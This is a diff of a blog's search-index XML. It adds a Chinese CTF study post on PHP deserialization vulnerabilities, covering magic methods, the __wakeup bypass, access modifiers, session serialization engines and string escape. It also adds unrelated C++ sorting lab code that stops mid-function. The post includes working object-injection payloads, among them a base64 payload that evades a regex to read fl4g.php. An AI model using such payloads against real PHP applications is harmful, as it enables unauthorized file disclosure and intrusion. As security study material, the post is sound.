+    $ctfer-&gt;name='Sch0lar';
+    $ctfer-&gt;age='18'
+    echo serialize($ctfer);  //将其序列化
+?&gt;
+</code></pre>
+<blockquote>
+<p>输出结果 O:3:”Ctf”:3{s:4:”flag”;s:13:”flag{abedyui}”;s:4:”name”;s:7:”Sch0lar”;s:3:”age”;s:2:”18”;} </p>
+<p>O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示 </p>
+<p>3代表类的名字长三个字符 </p>
+<p>Ctf 是类名 </p>
+<p>3代表这个类里有三个属性(三个变量)</p>
+<p>s代表字符串 </p>
+<p>4代表属性名的长度</p>
+<p>flag是属性名 s:13:”flag{adedyui}” 字符串，属性长度，属性值</p>
+</blockquote>
+<p>注：serialize()函数在执行前会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，**<code>__sleep()</code>方法会先被调用，然后才执行序列化操作**。</p>
+<p><strong>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性</strong></p>
+<p>exp :</p>
+<pre><code class="line-numbers language-php">&lt;?php
+    class Ctf{
+        public $flag='flag{****}';
+        public $name='cxk';
+        public $age='10';
+        public function __sleep(){
+            return array('flag','age');
+        }
+    }
+    $ctfer=new Ctf();
+    $ctfer-&gt;flag='flag{abedyui}';
+    $ctfer-&gt;name='Sch0lar';
+    $ctfer-&gt;age='18'
+    echo serialize($ctfer);
+?&gt;
+</code></pre>
+<p>运行结果：<strong>O:3:”Ctf”:2:{s:4:”flag”;s:13:”flag{abedyui}”;s:3:”age”;s:2:”18”;}</strong></p>
+<p>（注意一下，这边对php的版本有要求，此处我用的是php 5.2.17nts）</p>
+<h5 id="2-反序列化函数-unserialize"><a href="#2-反序列化函数-unserialize" class="headerlink" title="2.反序列化函数 unserialize()"></a>2.反序列化函数 unserialize()</h5><pre><code class="line-numbers language-php">&lt;?php
+    class Ctf{
+        public $flag='flag{****}';
+        public $name='cxk';
+        public $age='10';
+        
+    }
+    $ctfer=new Ctf();
+    $ctfer-&gt;flag='flag{abedyui}';
+    $ctfer-&gt;name='Sch0lar';
+    $ctfer-&gt;age='18';
+    $a = serialize($ctfer);    //O:3:"Ctf":2:{s:4:"flag";s:13:"flag{abedyui}";s:3:"age";s:2:"18";}
+    var_dump(unserialize($a));  //输出反序列化的结果
+?&gt;
+</code></pre>
+<p>运行结果：<strong>D:\phpstudy_pro\WWW\sleep.php:13: class Ctf#2 (3) { public $flag =&gt; string(13) “flag{abedyui}” public $name =&gt; string(7) “Sch0lar” public $age =&gt; string(2) “18” }</strong></p>
+<pre><code>D:\phpstudy_pro\WWW\sleep.php:13:
+class Ctf#2 (3) {
+  public $flag =&gt;
+  string(13) "flag{abedyui}"
+  public $name =&gt;
+  string(7) "Sch0lar"
+  public $age =&gt;
+  string(2) "18"
+}
+</code></pre>
+<p>注：unserialize() 执行时会检查是否存在一个 wakeup() 方法。 如果存在，则会先调用 wakeup方法。而涉及到__wakeup()函数，经常要用到的就是<strong>当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过wakeup()函数的执行。</strong></p>
+<blockquote>
+<p>__sleep()函数是在serialize(序函数列化一个对象前被调用，用来指定要序列化的属性</p>
+<p>__wakeup()函数则是在unserialize()反序列化一个字符串前被调用</p>
+</blockquote>
+<p>关于__wakeup()的实例：</p>
+<h6 id="1-攻防世界-web高手进阶区-unserialize3-wakeup-魔术方法"><a href="#1-攻防世界-web高手进阶区-unserialize3-wakeup-魔术方法" class="headerlink" title="1.攻防世界 web高手进阶区 unserialize3 (__wakeup()魔术方法)"></a>1.攻防世界 web高手进阶区 unserialize3 (<strong>__wakeup()魔术方法</strong>)</h6><p><a href="https://blog.csdn.net/LTtiandd/article/details/99591998">攻防世界unserialize3题解</a></p>
+<blockquote>
+<p>__wakeup() 将在被序列化后立即被调用 </p>
+<p><strong>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，会导致反序列化失败同时不会执行__wakeup()函数</strong></p>
+</blockquote>
+<pre><code class="line-numbers language-php">&lt;?php
+class Ab4ndon{
+        var $test = '123';
+}
+
+$a = new Ab4ndon();    //这里就是创建了一个新的对象
+
+$a_ser = serialize($a);   //将这个对象进行字符串封装，就是对其进行序列化
+
+//print_r($a_ser);
+$a_unser = unserialize($a_ser);//进行反序列化
+
+print_r($a_unser);
+?&gt;
+</code></pre>
+<p>代码：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+class xctf{
+    public $flag = '111';
+    public function __wakeup(){
+    exit('bad requests');
+    }
+}//这边注意一下方括号要对应，一开始少了这个方括号一直报错
+    $a = new xctf();
+    $a_ser = serialize($a);   //将这个对象进行字符串封装，就是对其进行序列化
+
+print_r($a_ser);  //输出序列化后的内容
+?&gt;
+</code></pre>
+<p>序列化结果：</p>
+<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
+<p>利用__wakeup()的漏洞，构造payload为：**?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}**</p>
+<h5 id="3-访问控制修饰符"><a href="#3-访问控制修饰符" class="headerlink" title="3.访问控制修饰符"></a>3.访问控制修饰符</h5><pre><code>public(公有) 
+protected(受保护)     // %00*%00属性名
+private(私有的)       // %00类名%00属性名
+</code></pre>
+<p>在本地写个php测试一下:</p>
+<pre><code class="line-numbers language-php">&lt;?php
+    class Ctf{
+        public $name='Ab4ndon';
+        protected $age='20';
+        private $flag='fl4g';
+    }
+    $ctfer=new Ctf();     //实例化一个对象
+    echo serialize($ctfer);
+?&gt;
+</code></pre>
+<p>输出结果：*<em>O:3:”Ctf”:3:{s:4:”name”;s:7:”Ab4ndon”;s:6:”<em>age”;s:2:”20”;s:9:”Ctfflag”;s:4:”fl4g”;}</em></em></p>
+<blockquote>
+<p>可以看到，protected 属性被序列化后age属性名的长度变成了6,为什么呢？因为age前还有**%00*%00**</p>
+<p>同样地，private 属性被序列化后flag属性名的长度也不是flag的原长，因为flag前面还有**%00Ctf%00**</p>
+</blockquote>
+<p>下面介绍一个考察__wakeup()和访问控制修饰符的题：</p>
+<h6 id="1-攻防世界-web高手进阶区-Web-php-unserialize"><a href="#1-攻防世界-web高手进阶区-Web-php-unserialize" class="headerlink" title="1.攻防世界 web高手进阶区 Web_php_unserialize"></a>1.攻防世界 web高手进阶区 Web_php_unserialize</h6><p>源码：</p>
+<pre><code class="line-numbers language-php">&lt;?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) {     //执行 __construct 方法，将传入的 $file 赋值给本地的私有方法 $file
+        $this-&gt;file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this-&gt;file, true);   //销毁时执行 __destruct 方法，高亮本地变量 file 文件的代码
+    }
+    function __wakeup() { 
+        if ($this-&gt;file != 'index.php') {        //当反序列化构造这个类时执行 __wakeup 方法，会将本地变量 file                                                     重新设置为 index.php
+            //the secret is in the fl4g.php
+            $this-&gt;file = 'index.php'; 
+        } 
+    } 
+}
+if (isset($_GET['var'])) { 
+    $var = base64_decode($_GET['var']);         //base64编码传入的var参数
+    if (preg_match('/[oc]:\d+:/i', $var)) {     //正则匹配 o:数字：或者 c:数字：，不区分大小写
+        die('stop hacking!'); 
+    } else {
+        @unserialize($var);                     //反序列化
+    } 
+} else { 
+    highlight_file("index.php"); 
+} 
+?&gt;
+</code></pre>
+<p>思路大致为：</p>
+<p>构造Demo类，传入$file=fl4g.php(传入的$file赋值给本地私有方法$file，然后__destruct()函数在对象销毁时执行，高亮本地变量file的代码，故我们将file赋值为我们想看的fl4g.php),然后将其序列化</p>
+<pre><code class="line-numbers language-php">&lt;?php 
+class Demo { 
+    private $file = 'fl4g.php';
+}
+
+$a =new Demo($file);
+echo serialize($a);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
+
+</code></pre>
+<p>将序列化结果中的属性个数改为2（绕过__wakeup()函数的执行），将o:4改为o:+4或者o:@4(绕过正则匹配)，Base64编码后get传参</p>
+<p>但是这样操作得不到flag，问题出在哪？</p>
+<p>$file是私有方法 private,前面提到private属性被序列化后属性名的形式为**%00类名%00属性名**,我们看到file本该是4个字符，序列化后确实10个字符。我尝试在Demo前后加%00再编码，失败，后来看别人的wp，才找到原因，<strong>因为复制粘贴时破坏了 “ %00 “ 这个特殊字符。 将序列化后的字符串直接存入文件不会破坏这个 “ %00 “ 特殊字符。</strong></p>
+<pre><code class="line-numbers language-php">&lt;?php 
+class Demo { 
+    private $file = 'fl4g.php';
+}
+
+$c =new Demo($file);
+$a=serialize($c);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
+
+$a = str_replace(':1:', ':2:', $a);        //绕过wakeup
+$a = str_replace('O:4', 'O:+4', $a);        //绕过正则匹配
+print_r($a);
+print_r("&lt;br&gt;");
+var_dump(base64_encode($a));        //base64编码
+//O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}&lt;br&gt;D:\phpstudy_pro\WWW\sleep.php:13:
+//string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
+</code></pre>
+<p>所以构造payload:<strong>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</strong></p>
+<blockquote>
+<p>注意学习这种直接写php去得到payload的方法，尤其是碰到private和protected时</p>
+<p>此处再贴一篇wp:<a href="https://moreant.github.io/post/60542.html">攻防世界 WEB Web_php_unserialize</a></p>
+</blockquote>
+<h5 id="4-魔术方法"><a href="#4-魔术方法" class="headerlink" title="4.魔术方法"></a>4.魔术方法</h5><p><strong>php反序列化漏洞触发条件：</strong> unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法</p>
+<p>接下来介绍一些常见的魔术方法（wakeup()和sleep()函数在前面已经介绍过了，就不再详述）</p>
+<pre><code>__construct() 当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。
+
+__destruct() 当一个对象销毁（反序列化）时被调用
+
+__toString() 当一个对象被当作一个字符串使用时被调用
+
+__sleep() 在对象在被序列化之前立即运行
+
+__wakeup() 将在序列化之后立即被调用
+</code></pre>
+<h6 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h6><pre><code class="line-numbers language-php">&lt;?php
+class xctf{
+    public $flag = '111';
+    function __construct() {
+        echo ("Ab4ndon!");
+    }
+}
+    
+    $a = new xctf();
+    
+?&gt;
+</code></pre>
+<p>运行结果：<strong>Ab4ndon!</strong></p>
+<p>可以很清楚地看出来construct()魔术方法在创建对象时进行了调用</p>
+<h6 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h6><pre><code class="line-numbers language-php">&lt;?php
+class Example {
+    var $var = '';
+    function __destruct() {
+        highlight_file($this-&gt;var);  //常用文件读取函数：readfile（需要去源码里看） highlight_file                                                                       show_source            file_get_contents（不会输出）
+    }
+}
+unserialize($_GET['a']);
+/*$obj = new Example();            //实例化一个对象，并将其序列化：O:7:"Example":1:{s:3:"var";s:8:"flag.php";}
+$obj-&gt;var='flag.php';
+var_dump(serialize($obj));
+*/
+?&gt;　
+    
+    
+  //flag.php
+    &lt;?php
+$flag="flag!!!!!";
+</code></pre>
+<p>payload如下：<code>?a=O:7:"Example":1:{s:3:"var";s:8:"flag.php";}</code></p>
+<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011115348580.png" alt="image-20201011115348580" style="zoom:67%;">
+
+<h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><h5 id="5-session反序列化"><a href="#5-session反序列化" class="headerlink" title="5.session反序列化"></a>5.session反序列化</h5><p>在php.ini中存在三项配置项：</p>
+<ul>
+<li><code>session.save_path=""</code> –设置session的存储路径</li>
+<li><code>session.save_handler=""</code> –<strong>设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</strong></li>
+<li><code>session.auto_start boolen</code> –指定会话模块是否在请求开始时启动一个会话，默认为0不启动</li>
+<li><code>session.serialize_handler string</code> –<strong>定义用来序列化/反序列化的处理器名字。默认使用php (php&lt;5.5.4)</strong></li>
+</ul>
+<p><strong>在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</strong></p>
+<table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>session存储方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php(php&lt;5.5.4)</td>
+<td>存储方式是，键名+竖线`</td>
+</tr>
+<tr>
+<td>php_serialize(php&gt;5.5.4)</td>
+<td>存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化）</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</td>
+</tr>
+</tbody></table>
+<p>在PHP (php&lt;5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set('session.serialize_handler', '需要设置的引擎名');</code>进行设置。</p>
+<p>示例代码如下：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');   //设置序列化引擎使用php_serialize
+session_start();
+// do something
+......
+</code></pre>
+<p><strong>由于序列化和反序列化所使用的序列化引擎不一样就是造成PHP Session序列化漏洞的原因</strong></p>
+<p>（此处使用的是php7.3.4nts）</p>
+<ul>
+<li>php引擎</li>
+</ul>
+<pre><code class="line-numbers language-php">&lt;?php
+ini_set('session.serialize_handler', 'php');
+session_start();      // session_start()会创建新会话或者重用现有会话
+$_SESSION['name'] = 'Ab4ndon';
+var_dump();
+?&gt;
+</code></pre>
+<p>去本地文件夹下找到存储session文件的地方，如我的：D:\phpstudy_pro\Extensions\tmp\tmp，发现一个sess开头的文件，sess_后面是PHPSESSID的值</p>
+<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011105453092.png" alt="image-20201011105453092" style="zoom:50%;">
+
+<p>打开，内容为：<strong>name|s:7:”Ab4ndon”;</strong>     <strong>键名+竖线<code>|</code>+经过serialize()函数序列处理的值（只序列化值</strong>）</p>
+<ul>
+<li>php_serialize引擎</li>
+</ul>
+<pre><code class="line-numbers language-php">&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();      // session_start()会创建新会话或者重用现有会话
+$_SESSION['name'] = 'Ab4ndon';
+var_dump();
+?&gt;
+</code></pre>
+<p>文件内容：<strong>a:1:{s:4:”name”;s:7:”Ab4ndon”;}</strong>    <strong>a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key(键)和value(值)都会进行序列化</strong>。</p>
+<ul>
+<li>php_binary</li>
+</ul>
+<pre><code class="line-numbers language-php">&lt;?php
+ini_set('session.serialize_handler', 'php_binary');
+session_start();      // session_start()会创建新会话或者重用现有会话
+$_SESSION['name'] = 'Ab4ndon';
+var_dump();
+?&gt;
+</code></pre>
+<p>文件内容：<strong>names:7:”Ab4ndon”;</strong>      键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值.由于name的长度是4，4在ASCII表中对应的就是。根据php_binary的存储规则，最后就是<code>names:7:"Ab4ndon";</code> </p>
+<h5 id="6-字符串逃逸"><a href="#6-字符串逃逸" class="headerlink" title="6.字符串逃逸"></a>6.字符串逃逸</h5><img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/YqFpH1.png" alt="1" style="zoom:67%;">
+
+<p>首先我们需要知道，在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。而且最后变量闭合都需要双引号以及结束的花括号，举个例子：</p>
+<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
+<p>和</p>
+<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx</code>(xxx是任意的一串字符)</p>
+<p>反序列化后的结果是一样的，也就是说，php在反序列化的时候是严格地按照一定的格式去进行的。</p>
+<p>如果指定的长度错误则反序列化就会失败。</p>
+<p>测试如下：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+class xctf{
+    public $flag = '111';
+}
+    
+    $a = new xctf();
+    $a_ser = serialize($a);   //O:4:"xctf":1:{s:4:"flag";s:3:"111";}
+
+//print_r($a_ser);
+$res=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}');
+$res2=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx');
+$res3=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"11";}');
+print_r($res);
+print_r($res2);
+print_r($res3);
+
+?&gt;
+</code></pre>
+<pre><code>//输出结果
+xctf Object          //$res
+(
+    [flag] =&gt; 111
+)
+xctf Object            //$res2
+(
+    [flag] =&gt; 111
+)
+</code></pre>
+<p>如果我们将111改为11，就会反序列化失败，我的vscode没有任何输出。</p>
+<p>为什么呢？因为此时的flag所读取的数据为11“而<strong>正常的语法是需要用”;去闭合当前的变量，而因为长度错误所以此时php把闭合的双引号当做了字符串，所以下一个字符就成了分号，没能闭合导致抛出了错误。</strong></p>
+<p><a href="https://www.cnblogs.com/Sumarua/p/12932401.html"></a><a href="https://www.cnblogs.com/Sumarua/p/12932401.html">PHP反序列化字符逃逸详解</a></p>
+<p><a href="https://www.cnblogs.com/hello-there/p/12870541.html">浅谈PHP字符串逃逸</a></p>
+<p>知识补充<br>unserialize漏洞依赖几个条件：</p>
+<p>unserialize函数的参数可控<br>脚本中存在一个构造函数（__construct()）、析构函数（__destruct()）、__wakeup()函数中有向php文件中写数据的操作的类<br>所写的内容需要有对象中的成员变量的值<br>防范的方法有：</p>
+<ol start="4">
+<li>严格控制unserialize函数的参数，坚持用户所输入的信息都是不可靠的原则</li>
+<li>对于unserialize后的变量内容进行检查，以确定内容没有被污染</li>
+</ol>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>PHP反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -2143,395 +2560,1127 @@ CODE      ENDS
       </tags>
   </entry>
   <entry>
-    <title>PHP反序列化漏洞学习</title>
-    <url>/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/</url>
-    <content><![CDATA[<p>首先，什么是序列化？</p>
-<p><strong>序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。</strong><br><strong>反序列化则相反将字符串重新恢复成对象</strong></p>
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>过程</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>序列化</td>
-<td>对象—&gt; 字符串</td>
-</tr>
-<tr>
-<td>反序列化</td>
-<td>字符串—&gt;对象</td>
-</tr>
-</tbody></table>
-<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/1893076-20200711232303502-1979730084.png" alt="1893076-20200711232303502-1979730084.png" style="zoom:60%;">
+    <title>【NJUPT】 算法实验（合集）</title>
+    <url>/2021/07/06/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E5%90%88%E9%9B%86/</url>
+    <content><![CDATA[<h2 id="实验一："><a href="#实验一：" class="headerlink" title="实验一："></a>实验一：</h2><p>1用分治法实现一组无序序列的两路合并排序和快速排序。 要求清楚合并排序及快速排 序的基本原理， 编程实现分别用这两种方法将输入的一组无序序列排序为有序序列后输出。 </p>
+<p>2采用基于“五元中值组取中值分割法”（median-of-median-of-five partitioning） 的线性<br> 时间选择算法，找出 N 个元素集合 S 中的第 k 个最小的元素，使其在线性时间内解决。（参<br> 考教材 5.5.3 节）</p>
+<p>​        <strong>分治法</strong>采用将一个难以直接求解的复杂问题分解成若干个规模较小、相互独立，但类型相同的子问题，直到子问题足够小，能够直接求解为止，然后求解这些子问题，并且将子问题的解合成原始问题的一个完整解的策略。基于这样一种策略，我们可以用它来解决一系列复杂的问题。对于排序问题，将原来的序列分成一个个子序列后分别进行排序，再将已排序的子序列合成一个有序序列是可行的，所以符合分治法策略。不过，合并排序和快速排序虽然都运用分治策略，但两者的角度不同，得到的排序算法也不相同。合并排序的问题分解过程十分简单，只需将序列一分为二即可：而快速排序的问题分解方法相对较困难，需调用Partition函数将一个序列划分为子序列。然而，从子问题解得到原问题解的过程对于快速排序来说异常简单，几乎无须额外的工作；但对于合并排序，则需要调用Merge函数来实现。所以，其实Partition函数和Merge函数是这两种排序算法的核心。而线性时间选择第k小元素这个算法我觉得也是受到了快速排序中的分划方法的启迪，采用分治法策略去求。</p>
+<h3 id="1-合并排序与快速排序"><a href="#1-合并排序与快速排序" class="headerlink" title="1.合并排序与快速排序"></a>1.合并排序与快速排序</h3><pre><code class="line-numbers language-c++">#include&lt;iostream&gt;
+#include&lt;fstream&gt;
+#define INFTY 2147483647;
+using namespace std;
 
-<h5 id="1-序列化函数serialize"><a href="#1-序列化函数serialize" class="headerlink" title="1.序列化函数serialize()"></a>1.序列化函数serialize()</h5><pre><code class="line-numbers language-php">&lt;?php
-    class Ctf{
-        public $flag='flag{****}';
-        public $name='cxk';
-        public $age='10';
+class SortableList
+{
+    public:
+        SortableList(int mSize)
+        {
+            maxSize = mSize;
+            l = new int[maxSize];
+            n = 0;
+        }
+        ~SortableList()
+    {
+    delete[] l;
     }
-    $ctfer=new Ctf();     //实例化一个对象
-    $ctfer-&gt;flag='flag{adedyui}';
-    $ctfer-&gt;name='Sch0lar';
-    $ctfer-&gt;age='18'
-    echo serialize($ctfer);  //将其序列化
-?&gt;
+        void Input();
+        void Output();
+        void MergeSort();
+        void QuickSort();
+    private:
+        int *l;
+        int maxSize;
+        int n;
+        void Merge(int left,int mid,int right);
+        void MergeSort(int left,int right);
+        void QuickSort(int left, int right);
+        void Swap(int i,int j);
+        int Partition(int left, int right);
+        
+        
+};
+
+void SortableList::Merge(int left,int mid,int right)
+{
+    int *temp = new int[right - left + 1];
+    int i = left, j = mid + 1, k = 0;
+    while((i&lt;=mid)&amp;&amp;(j&lt;=right))
+        if(l[i]&lt;=l[j])
+            temp[k++] = l[i++];
+        else
+            temp[k++] = l[j++];
+    while(i&lt;=mid)                //将剩余元素输出
+        temp[k++] = l[i++];
+    while(j&lt;=right)
+        temp[k++] = l[j++];
+    for (i = 0, k = left; k &lt;= right;)  //将排好序的有序序列复制到原序列中去
+        l[k++] = temp[i++];
+}
+
+void SortableList::MergeSort()
+{
+    MergeSort(0,n-1);
+}
+void SortableList::MergeSort(int left,int right)
+{
+    if(left&lt;right)
+    {
+        int mid = left + (right-left) / 2;
+        MergeSort(left,mid);
+        MergeSort(mid+1,right);
+        Merge(left,mid,right);
+    }
+}
+
+void SortableList::Swap(int i,int j)
+{
+    int temp = l[i];
+    l[i] = l[j];
+    l[j] = temp;
+}
+
+int SortableList::Partition(int left,int right)
+{
+    int i = left, j = right + 1;
+    l[n]=INFTY;
+    do{
+        do
+            i++;
+        while (l[i]&lt;l[left]);
+        do
+            j--;
+        while (l[j]&gt;l[left]);
+        if(i&lt;j)
+            Swap(i,j);
+    } while (i &lt; j);
+    Swap(left,j);
+    return j;
+}
+
+void SortableList::QuickSort()
+{
+    QuickSort(0,n-1);
+}
+void SortableList::QuickSort(int left,int right)
+{
+    if(left&lt;right)
+    {
+        int j = Partition(left,right);
+        QuickSort(left,j-1);
+        QuickSort(j+1,right);
+    }
+}
+
+// void SortableList::Input()
+// {
+//     for (int i = 0; i &lt; maxSize;i++)
+//     {
+//         cin &gt;&gt; l[i];
+//         n++;
+//     }
+// }
+
+void SortableList::Input()
+{
+    int i = 0;
+    ifstream out ("Sort.txt");
+    if(!out)
+    {
+        cout &lt;&lt; "Can not open output file.\n";
+        return;
+    }
+    for (i = 0; i &lt; maxSize;i++)
+    {
+        out &gt;&gt; l[i];
+        n++;
+    }
+    out.close();
+   
+}
+
+void SortableList::Output()
+{
+    for (int i = 0; i &lt; maxSize;i++)
+    {
+        cout &lt;&lt; l[i] &lt;&lt; " ";
+       // cout &lt;&lt; endl;
+    }
+}
+
+int main()
+{
+    int key;
+    int x, k;
+    SortableList list(30);
+    cout &lt;&lt; "原始序列：\n" &lt;&lt; endl;
+    list.Input();
+    list.Output();
+    cout &lt;&lt; "\n\n请选择排序算法：【0】两路合并排序  【1】快速排序\n" &lt;&lt; endl;
+    cin &gt;&gt; key;
+    
+    if(key==0)
+    {
+        list.MergeSort();
+    }
+    else
+        list.QuickSort();
+    cout &lt;&lt; "排序后的序列：\n\n";
+    list.Output();
+   
+}
 </code></pre>
-<blockquote>
-<p>输出结果 O:3:”Ctf”:3{s:4:”flag”;s:13:”flag{abedyui}”;s:4:”name”;s:7:”Sch0lar”;s:3:”age”;s:2:”18”;} </p>
-<p>O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示 </p>
-<p>3代表类的名字长三个字符 </p>
-<p>Ctf 是类名 </p>
-<p>3代表这个类里有三个属性(三个变量)</p>
-<p>s代表字符串 </p>
-<p>4代表属性名的长度</p>
-<p>flag是属性名 s:13:”flag{adedyui}” 字符串，属性长度，属性值</p>
-</blockquote>
-<p>注：serialize()函数在执行前会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，**<code>__sleep()</code>方法会先被调用，然后才执行序列化操作**。</p>
-<p><strong>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性</strong></p>
-<p>exp :</p>
-<pre><code class="line-numbers language-php">&lt;?php
-    class Ctf{
-        public $flag='flag{****}';
-        public $name='cxk';
-        public $age='10';
-        public function __sleep(){
-            return array('flag','age');
+<h3 id="2-选择第k小元素"><a href="#2-选择第k小元素" class="headerlink" title="2.选择第k小元素"></a>2.选择第k小元素</h3><p>​       求第k小元素其实可以直接通过排序算法将原序列排序好，然后取出第k小元素即可，但是这样的话在最坏情况下的时间复杂度就不是线性的了，比如采用快速排序，那么在最坏情况下时间复杂度为O(n^2)。人们并不满足与这样的时间复杂度，所以继续去优化这样的一个算法，采用二次取中法确定主元的方式使得分划所得的两个子集合的大小相对接近，从而避免了上述最坏情况的发生，使得最坏情况下的时间复杂度也是O(n),我想这就是算法设计与分析的魅力所在，通过应用或设计一种算法去不断优化时空复杂度。</p>
+<pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
+#include &lt;fstream&gt;
+#define INFTY 2147483647;
+using namespace std;
+
+class SortableList
+{
+    public:
+        SortableList(int mSize)
+        {
+            maxSize = mSize;
+            l = new int[maxSize];
+            n = 0;
+        }
+        ~SortableList()
+    {
+    delete[] l;
+    }
+        void Input();
+        void Output();
+        void MergeSort();
+        int Select(int&amp; x,int k);
+        int Ceil(int a,int b);
+
+    private:
+        int *l;
+        int maxSize;
+        int n;
+        void Merge(int left,int mid,int right);
+        void MergeSort(int left,int right);
+        void Swap(int i,int j);
+        int Partition(int left, int right);
+        int Select(int k,int left,int right,int r);
+        
+};
+
+void SortableList::Merge(int left,int mid,int right)
+{
+    int *temp = new int[right - left + 1];
+    int i = left, j = mid + 1, k = 0;
+    while((i&lt;=mid)&amp;&amp;(j&lt;=right))
+        if(l[i]&lt;=l[j])
+            temp[k++] = l[i++];
+        else
+            temp[k++] = l[j++];
+    while(i&lt;=mid)                //将剩余元素输出
+        temp[k++] = l[i++];
+    while(j&lt;=right)
+        temp[k++] = l[j++];
+    for (i = 0, k = left; k &lt;= right;)  //将排好序的有序序列复制到原序列中去
+        l[k++] = temp[i++];
+}
+
+void SortableList::MergeSort()
+{
+    MergeSort(0,n-1);
+}
+void SortableList::MergeSort(int left,int right)
+{
+    if(left&lt;right)
+    {
+        int mid = left + (right-left) / 2;
+        MergeSort(left,mid);
+        MergeSort(mid+1,right);
+        Merge(left,mid,right);
+    }
+}
+
+void SortableList::Swap(int i,int j)
+{
+    int temp = l[i];
+    l[i] = l[j];
+    l[j] = temp;
+}
+
+int SortableList::Partition(int left,int right)
+{
+    int i = left, j = right + 1;
+    l[n]=INFTY;
+    do{
+        do
+            i++;
+        while (l[i]&lt;l[left]);
+        do
+            j--;
+        while (l[j]&gt;l[left]);
+        if(i&lt;j)
+            Swap(i,j);
+    } while (i &lt; j);
+    Swap(left,j);
+    return j;
+}
+
+
+void SortableList::Input()
+{
+    int i = 0;
+    ifstream out ("Sort.txt");
+    if(!out)
+    {
+        cout &lt;&lt; "Can not open output file.\n";
+        return;
+    }
+    for (i = 0; i &lt; maxSize;i++)
+    {
+        out &gt;&gt; l[i];
+        n++;
+    }
+    out.close();
+   
+}
+
+void SortableList::Output()
+{
+    for (int i = 0; i &lt; maxSize;i++)
+    {
+        cout &lt;&lt; l[i] &lt;&lt; " ";
+       // cout &lt;&lt; endl;
+    }
+}
+
+int SortableList::Ceil(int a,int b)
+{
+    return (int)(a / b) + 1;
+}
+
+int SortableList::Select(int&amp;x,int k)
+{
